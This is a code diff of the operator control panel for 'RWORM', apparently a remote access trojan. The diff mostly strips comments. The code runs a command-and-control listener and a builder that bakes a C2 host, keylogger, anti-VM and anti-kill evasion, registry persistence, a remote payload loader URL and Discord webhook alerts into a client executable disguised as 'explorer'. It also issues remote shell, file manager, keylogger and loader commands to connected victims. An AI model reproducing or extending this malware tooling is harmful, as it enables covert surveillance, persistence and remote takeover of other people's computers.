@@ -25,27 +25,27 @@ namespace RWORM.GUI.ViewModels
         private string _commandInput   = "";
         private string _terminalOutput = "";
 
-        // ── Listener ─────────────────────────────────────────────────────────
+        
         private string  _listenerHost    = "0.0.0.0";
         private int     _listenerPort    = 3333;
         private bool    _listenerRunning;
         private string  _listenerStatus  = "Stopped";
         private System.Diagnostics.Process? _serverProcess;
 
-        // ── Builder ───────────────────────────────────────────────────────────
+        
         private string _buildHost       = "127.0.0.1";
         private int    _buildPort       = 3333;
         private string _buildOutput     = "RWORM.exe";
 
-        // Keylogger builder options
+        
         private bool   _buildKeyloggerEnabled;
         private bool   _buildKeyloggerOnline;
 
-        // Task on connect options
+        
         private bool   _buildTaskEnabled;
         private string _buildTaskUrl    = "";
 
-        // Tasks Discord Webhook options
+        
         private bool   _taskDiscordAlert = true;
         private string _taskDiscordWebhook = "";
         public bool    TaskDiscordAlert   { get => _taskDiscordAlert; set { _taskDiscordAlert = value; OnPropertyChanged(); } }
@@ -55,7 +55,7 @@ namespace RWORM.GUI.ViewModels
             set { _taskDiscordWebhook = value; OnPropertyChanged(); }
         }
 
-        // Surveillance & Evasion builder options
+        
         private bool   _buildAntiKill = true;
         private bool   _buildObfuscator = false;
         private bool   _buildAntiSandbox;
@@ -67,7 +67,7 @@ namespace RWORM.GUI.ViewModels
         private string _buildPastebinRaw = "";
         private string _buildEncryptionKey = "AES-256-DEFAULT";
 
-        // New Builder Assembly / Icon / Pastebin options
+        
         private bool   _buildPastebinEnabled = false;
         private bool   _buildAssemblyEnabled = true;
         private string _buildAssemblyTitle = "explorer";
@@ -93,7 +93,7 @@ namespace RWORM.GUI.ViewModels
             set { _selectedTask = value; OnPropertyChanged(); }
         }
 
-        // ── Properties ────────────────────────────────────────────────────────
+        
         public string SelectedView   { get => _selectedView; 
             set { _selectedView = value; OnPropertyChanged(); } }
         public string ServerAddress  { get => _serverAddress; set { _serverAddress = value; OnPropertyChanged(); } }
@@ -106,13 +106,13 @@ namespace RWORM.GUI.ViewModels
         public string TerminalOutput { get => _terminalOutput; set { _terminalOutput = value; OnPropertyChanged(); } }
         public int    ClientCount    => Clients.Count;
 
-        // Listener
+        
         public string ListenerHost   { get => _listenerHost;   set { _listenerHost   = value; OnPropertyChanged(); } }
         public int    ListenerPort   { get => _listenerPort;   set { _listenerPort   = value; OnPropertyChanged(); } }
         public bool   ListenerRunning { get => _listenerRunning; set { _listenerRunning = value; OnPropertyChanged(); } }
         public string ListenerStatus  { get => _listenerStatus;  set { _listenerStatus  = value; OnPropertyChanged(); } }
 
-        // Builder
+        
         public string BuildHost    { get => _buildHost;    set { _buildHost    = value; OnPropertyChanged(); } }
         public int    BuildPort    { get => _buildPort;    set { _buildPort    = value; OnPropertyChanged(); } }
         public string BuildOutput  { get => _buildOutput;  set { _buildOutput  = value; OnPropertyChanged(); } }
@@ -145,7 +145,7 @@ namespace RWORM.GUI.ViewModels
         public bool   BuildIconEnabled      { get => _buildIconEnabled;      set { _buildIconEnabled      = value; OnPropertyChanged(); } }
         public string BuildIconPath         { get => _buildIconPath;         set { _buildIconPath         = value; OnPropertyChanged(); } }
 
-        // ── Commands ──────────────────────────────────────────────────────────
+        
         public ICommand ConnectCommand         { get; }
         public ICommand DisconnectCommand      { get; }
         public ICommand NavigateCommand        { get; }
@@ -160,7 +160,7 @@ namespace RWORM.GUI.ViewModels
         public ICommand CloneAssemblyCommand   { get; }
         public ICommand SelectIconCommand      { get; }
 
-        // Client context commands — all accept ClientModel parameter
+        
         public ICommand OpenShellCommand          { get; }
         public ICommand OpenFileManagerCommand     { get; }
         public ICommand OpenKeyloggerCommand       { get; }
@@ -193,7 +193,7 @@ namespace RWORM.GUI.ViewModels
         public ICommand WatchdogStopCommand        { get; }
         public ICommand WatchdogStartCommand       { get; }
 
-        // Multi-select commands
+        
         public ICommand SendToAllCommand           { get; }
         public ICommand SendQuickCommand           { get; }
 
@@ -204,7 +204,7 @@ namespace RWORM.GUI.ViewModels
             set { _quickCommandText = value; OnPropertyChanged(); }
         }
 
-        // Tasks
+        
         public ICommand AddDiscordWebhookTaskCommand { get; }
         public ICommand AddLocalFileTaskCommand    { get; }
         public ICommand AddUrlTaskCommand          { get; }
@@ -214,7 +214,7 @@ namespace RWORM.GUI.ViewModels
 
         internal ServerConnection Server => _server;
 
-        // ── Constructor ───────────────────────────────────────────────────────
+        
         public MainViewModel()
         {
             _server = new ServerConnection(_serverAddress, _serverPort);
@@ -244,7 +244,7 @@ namespace RWORM.GUI.ViewModels
             StopListenerCommand   = new RelayCommand(_ => StopListener(),  _ => ListenerRunning);
             BuildCommand          = new RelayCommand(_ => BuildClient());
 
-            // Context commands unconditionally return CanExecute=true so WPF never disables menu items
+            
             OpenShellCommand          = new RelayCommand(p => OpenShell(p as ClientModel));
             OpenFileManagerCommand    = new RelayCommand(p => OpenFileManager(p as ClientModel));
             OpenKeyloggerCommand      = new RelayCommand(p => OpenKeylogger(p as ClientModel));
@@ -279,7 +279,7 @@ namespace RWORM.GUI.ViewModels
             SendToAllCommand          = new RelayCommand(_ => ExecuteQuickCommand());
             SendQuickCommand          = new RelayCommand(_ => ExecuteQuickCommand());
 
-            // Tasks
+            
             TestTaskDiscordWebhookCommand = new RelayCommand(async _ => await TestTaskDiscordWebhookAsync());
             AddDiscordWebhookTaskCommand = new RelayCommand(_ => AddDiscordWebhookTask());
             AddLocalFileTaskCommand   = new RelayCommand(_ => AddLocalFileTask());
@@ -293,11 +293,11 @@ namespace RWORM.GUI.ViewModels
             });
         }
 
-        // ── Connect / Disconnect ──────────────────────────────────────────────
+        
         private async Task ConnectAsync()
         {
             StatusMessage = "Connecting...";
-            try { _server.Disconnect(); } catch { }   // drop any previous connection
+            try { _server.Disconnect(); } catch { }   
             GuiCrypto.KeyString = BuildEncryptionKey;
             _server = new ServerConnection(ServerAddress, ServerPort);
             _server.ClientsReceived += (_, list) => ApplyClientList(list);
@@ -321,7 +321,7 @@ namespace RWORM.GUI.ViewModels
             OnPropertyChanged(nameof(ClientCount));
         }
 
-        // ── Polling ───────────────────────────────────────────────────────────
+        
         private async Task PollClientsLoop()
         {
             while (_server.Connected)
@@ -347,14 +347,14 @@ namespace RWORM.GUI.ViewModels
 
                 var newDict = newClients.ToDictionary(c => c.Guid, StringComparer.OrdinalIgnoreCase);
 
-                // Remove disconnected clients
+                
                 for (int i = Clients.Count - 1; i >= 0; i--)
                 {
                     if (!newDict.ContainsKey(Clients[i].Guid))
                         Clients.RemoveAt(i);
                 }
 
-                // Update existing or add new
+                
                 foreach (var nc in newClients)
                 {
                     var existing = Clients.FirstOrDefault(c => string.Equals(c.Guid, nc.Guid, StringComparison.OrdinalIgnoreCase));
@@ -375,7 +375,7 @@ namespace RWORM.GUI.ViewModels
                     }
                 }
 
-                // Restore selection
+                
                 if (selectedGuids.Count > 0)
                 {
                     foreach (var c in Clients)
@@ -392,7 +392,7 @@ namespace RWORM.GUI.ViewModels
 
                 OnPropertyChanged(nameof(ClientCount));
 
-                // Auto-run tasks on newly connected clients (per-session key: ID or GUID:LastSeen)
+                
                 foreach (var task in Tasks.ToList())
                 {
                     foreach (var c in Clients.ToList())
@@ -414,7 +414,7 @@ namespace RWORM.GUI.ViewModels
             else dispatcher.Invoke(Apply);
         }
 
-        // ── Target Resolution & Quick Command ──────────────────────────────────
+        
         private readonly List<ClientModel> _contextMenuSnapshot = new();
         public void SnapshotContextMenu()
         {
@@ -478,7 +478,7 @@ namespace RWORM.GUI.ViewModels
             StatusMessage = $"Command sent to {count} client(s)";
         }
 
-        // ── Shell windows ─────────────────────────────────────────────────────
+        
         private void OpenShell(ClientModel? c)
         {
             var target = ResolveTargets(c).FirstOrDefault();
@@ -566,7 +566,7 @@ namespace RWORM.GUI.ViewModels
             }
         }
 
-        // 0xD9 MSGBOX_RESP — {"result":N,"button":"X"}
+        
         private void OnMessageBoxResult(string guid, byte[] resp)
         {
             string host = guid;
@@ -681,7 +681,7 @@ namespace RWORM.GUI.ViewModels
             StatusMessage = $"Power action '{action}' dispatched to {targets.Count} client(s)";
         }
 
-        // ── Client control ────────────────────────────────────────────────────
+        
         private void PromptLoaderExec(ClientModel? c)
         {
             var targets = ResolveTargets(c);
@@ -786,7 +786,7 @@ namespace RWORM.GUI.ViewModels
             ExecuteQuickCommand();
         }
 
-        // ── Tasks ─────────────────────────────────────────────────────────────
+        
         private async Task ExecuteTaskOnClientAsync(TaskModel task, ClientModel client)
         {
             string sessionKey = !string.IsNullOrWhiteSpace(client.Id)
@@ -866,7 +866,7 @@ namespace RWORM.GUI.ViewModels
                 "All Clients",
                 task.ModeLabel);
 
-            // Auto-run on currently connected clients immediately
+            
             foreach (var client in Clients.ToList())
             {
                 _ = ExecuteTaskOnClientAsync(task, client);
@@ -899,7 +899,7 @@ namespace RWORM.GUI.ViewModels
                 "Broadcast to connected clients",
                 task.ModeLabel);
 
-            // Auto-run on currently connected clients immediately
+            
             foreach (var client in Clients.ToList())
             {
                 _ = ExecuteTaskOnClientAsync(task, client);
@@ -928,7 +928,7 @@ namespace RWORM.GUI.ViewModels
                 "Broadcast to connected clients",
                 task.ModeLabel);
 
-            // Auto-run on currently connected clients immediately
+            
             foreach (var client in Clients.ToList())
             {
                 _ = ExecuteTaskOnClientAsync(task, client);
@@ -1039,7 +1039,7 @@ namespace RWORM.GUI.ViewModels
                         {
                             title = title,
                             description = description,
-                            color = 0x2ECC71, // Green
+                            color = 0x2ECC71, 
                             fields = new[]
                             {
                                 new { name = "Task", value = taskName, inline = true },
@@ -1058,7 +1058,7 @@ namespace RWORM.GUI.ViewModels
             catch { }
         }
 
-        // ── Send command ──────────────────────────────────────────────────────
+        
         private async Task SendCommandAsync()
         {
             if (SelectedClient == null || string.IsNullOrEmpty(CommandInput)) return;
@@ -1067,17 +1067,17 @@ namespace RWORM.GUI.ViewModels
             CommandInput = "";
         }
 
-        // ── Listener lifecycle ────────────────────────────────────────────────
+        
         private async void StartListener()
         {
             try
             {
-                // ── Kill any stale server.py holding the port ──────────────
-                // The server keeps its imported modules in memory, so edited
-                // server/protocol/session code is NOT picked up by a running
-                // process. A stale listener silently stops answering
-                // GET_CLIENTS (0x10) → Clients page stays empty. Always
-                // terminate old listeners before (re)starting.
+                
+                
+                
+                
+                
+                
                 KillStaleServerProcesses();
 
                 var repoRoot = ResolveRepoRoot();
@@ -1107,8 +1107,8 @@ namespace RWORM.GUI.ViewModels
                 _serverProcess.StartInfo.EnvironmentVariables["PYTHONIOENCODING"] = "utf-8";
                 _serverProcess.StartInfo.EnvironmentVariables["PYTHONUTF8"] = "1";
 
-                // Capture server output so a startup failure is visible in the
-                // UI instead of dying silently in a hidden window.
+                
+                
                 _serverProcess.OutputDataReceived += (_, e) => { if (e.Data != null) AppendListenerLog(e.Data); };
                 _serverProcess.ErrorDataReceived  += (_, e) => { if (e.Data != null) AppendListenerLog(e.Data); };
 
@@ -1123,7 +1123,7 @@ namespace RWORM.GUI.ViewModels
                 ListenerRunning = true;
                 ListenerStatus  = $"Starting on {ListenerHost}:{ListenerPort}...";
 
-                // Wait for the listener to actually accept connections.
+                
                 var ready = await WaitForListenAsync(ListenerHost, ListenerPort, 20000);
                 if (!ready)
                 {
@@ -1134,10 +1134,10 @@ namespace RWORM.GUI.ViewModels
 
                 ListenerStatus = $"Running on {ListenerHost}:{ListenerPort}";
 
-                // ── Auto-connect the panel to the listener we just started ──
-                // Without this the GUI has no connection, so GetClientsAsync
-                // returns an empty list, the poll loop never starts and the
-                // Clients page stays blank even though clients are connected.
+                
+                
+                
+                
                 ServerAddress = ListenerHost == "0.0.0.0" ? "127.0.0.1" : ListenerHost;
                 ServerPort    = ListenerPort;
                 await ConnectAsync();
@@ -1148,10 +1148,10 @@ namespace RWORM.GUI.ViewModels
             }
         }
 
-        /// <summary>
-        /// Polls the listener port until it accepts a TCP connection.
-        /// 0.0.0.0 is a bind address, so loopback is used to probe it.
-        /// </summary>
+        
+        
+        
+        
         private static async Task<bool> WaitForListenAsync(string host, int port, int timeoutMs)
         {
             var probe   = host is "0.0.0.0" or "*" or "" ? "127.0.0.1" : host;
@@ -1222,14 +1222,14 @@ namespace RWORM.GUI.ViewModels
             catch { }
         }
 
-        /// <summary>
-        /// Terminates leftover <c>server/main.py</c> listeners EXCEPT the one
-        /// this window already started, and except any process whose parent is
-        /// still alive (a manual <c>python server/main.py</c> launched from a
-        /// terminal the user still has open). A stale listener keeps old module
-        /// code in memory, so server edits are never picked up; it then stops
-        /// answering GET_CLIENTS (0x10) and the Clients page stays blank.
-        /// </summary>
+        
+        
+        
+        
+        
+        
+        
+        
         private void KillStaleServerProcesses()
         {
             try
@@ -1280,9 +1280,9 @@ namespace RWORM.GUI.ViewModels
             catch { }
         }
 
-        // ── Builder Window ────────────────────────────────────────────────────
+        
         private Views.BuilderWindow? _builderWindow;
-        public void OpenBuilderWindow()
+        public void OpenBuilderWindow(System.Windows.Point? launchOrigin = null)
         {
             var dispatcher = System.Windows.Application.Current?.Dispatcher;
             void Show()
@@ -1291,7 +1291,7 @@ namespace RWORM.GUI.ViewModels
                 {
                     if (_builderWindow == null || !_builderWindow.IsLoaded)
                     {
-                        _builderWindow = new Views.BuilderWindow(this);
+                        _builderWindow = new Views.BuilderWindow(this, launchOrigin);
                         _builderWindow.Closed += (s, e) => _builderWindow = null;
                         _builderWindow.Show();
                     }
@@ -1313,7 +1313,7 @@ namespace RWORM.GUI.ViewModels
             else dispatcher.Invoke(Show);
         }
 
-        // ── Builder ───────────────────────────────────────────────────────────
+        
         private async void BuildClient()
         {
             var dlg = new Microsoft.Win32.SaveFileDialog
@@ -1337,11 +1337,11 @@ namespace RWORM.GUI.ViewModels
 
                 var cfg = System.IO.File.ReadAllText(clientConfigPath);
 
-                // Core — the Config.cs fields are column-aligned (many spaces
-                // around '='), so a plain Replace("C2Host = \"...\"") never
-                // matches and the built EXE silently keeps the old host/port.
-                // Use regex assignment so the builder always applies the
-                // values entered in the UI.
+                
+                
+                
+                
+                
                 cfg = System.Text.RegularExpressions.Regex.Replace(
                     cfg, @"C2Host\s*=\s*""[^""]*""",
                     $"C2Host = \"{BuildHost}\"");
@@ -1352,7 +1352,7 @@ namespace RWORM.GUI.ViewModels
                     cfg, @"EncryptionKey\s*=\s*""[^""]*""",
                     $"EncryptionKey = \"{BuildEncryptionKey.Replace("\"", "\\\"")}\"");
 
-                // Keylogger
+                
                 cfg = System.Text.RegularExpressions.Regex.Replace(
                     cfg, @"KeyloggerEnabled\s*=\s*(true|false)",
                     $"KeyloggerEnabled = {BuildKeyloggerEnabled.ToString().ToLower()}");
@@ -1360,7 +1360,7 @@ namespace RWORM.GUI.ViewModels
                     cfg, @"KeyloggerOnline\s*=\s*(true|false)",
                     $"KeyloggerOnline  = {BuildKeyloggerOnline.ToString().ToLower()}");
 
-                // Task on connect
+                
                 cfg = System.Text.RegularExpressions.Regex.Replace(
                     cfg, @"TaskEnabled\s*=\s*(true|false)",
                     $"TaskEnabled   = {BuildTaskEnabled.ToString().ToLower()}");
@@ -1368,7 +1368,7 @@ namespace RWORM.GUI.ViewModels
                     cfg, @"TaskLoaderUrl\s*=\s*""[^""]*""",
                     $"TaskLoaderUrl = \"{BuildTaskUrl}\"");
 
-                // Anti-Kill & Evasion
+                
                 cfg = System.Text.RegularExpressions.Regex.Replace(
                     cfg, @"AntiKill\s*=\s*(true|false)",
                     $"AntiKill  = {BuildAntiKill.ToString().ToLower()}");
@@ -1379,7 +1379,7 @@ namespace RWORM.GUI.ViewModels
                     cfg, @"AntiVM\s*=\s*(true|false)",
                     $"AntiVM    = {BuildAntiSandbox.ToString().ToLower()}");
 
-                // Discord Webhook Alerts
+                
                 cfg = System.Text.RegularExpressions.Regex.Replace(
                     cfg, @"DiscordAlert\s*=\s*(true|false)",
                     $"DiscordAlert   = {BuildDiscordAlert.ToString().ToLower()}");
@@ -1387,7 +1387,7 @@ namespace RWORM.GUI.ViewModels
                     cfg, @"DiscordWebhook\s*=\s*""[^""]*""",
                     $"DiscordWebhook = \"{BuildDiscordWebhook.Replace("\"", "\\\"")}\"");
 
-                // Persistence & Pastebin
+                
                 cfg = System.Text.RegularExpressions.Regex.Replace(
                     cfg, @"StartupRegistry\s*=\s*(true|false)",
                     $"StartupRegistry = {BuildStartupRegistry.ToString().ToLower()}");
@@ -1403,7 +1403,7 @@ namespace RWORM.GUI.ViewModels
 
                 System.IO.File.WriteAllText(clientConfigPath, cfg);
 
-                // Configure Client .csproj with optional Assembly and Icon metadata
+                
                 var clientCsprojPath = System.IO.Path.Combine(baseDir, "Client", "RWORM.Client.csproj");
                 var originalCsproj = System.IO.File.ReadAllText(clientCsprojPath);
                 string? tempIconDest = null;
@@ -1531,7 +1531,7 @@ namespace RWORM.GUI.ViewModels
             }
         }
 
-        // ── Events ────────────────────────────────────────────────────────────
+        
         private void OnConnectionChanged(object? s, bool connected)
         {
             IsConnected   = connected;
